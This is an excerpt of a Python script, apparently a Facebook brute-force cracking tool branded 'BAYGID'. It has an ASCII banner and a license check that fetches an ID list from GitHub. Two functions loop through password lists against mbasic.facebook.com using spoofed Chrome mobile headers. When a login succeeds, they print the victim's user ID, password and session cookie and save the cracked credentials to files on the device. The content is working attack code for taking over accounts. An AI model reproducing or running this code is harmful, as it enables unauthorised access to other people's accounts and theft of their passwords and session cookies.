...
╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝╚═════╝                                            
  ...
  try:
    httpCaht = requests.get("https://github.com/BAYGID9/BAYGID4/blob/main/BAYGID4.txt").text
    if id in httpCaht:
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mBAYGID\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [BAYGID-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/BAYGID-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/BAYGID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def c(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffhC3Vt_N7VRf5Hh0JNU1DveLzretHfXY1pjDcPyJWnEFDQntaVKF-5OhHlDNA0_SyrBh7TIyS7z60c7hmnttvT_5fdkHSGaLJ2dreJ1fd_JA&smuh=3491&lh=Ac9BmE3clx-nmn8Nb74&ref=dbl&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/BAYGID-OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
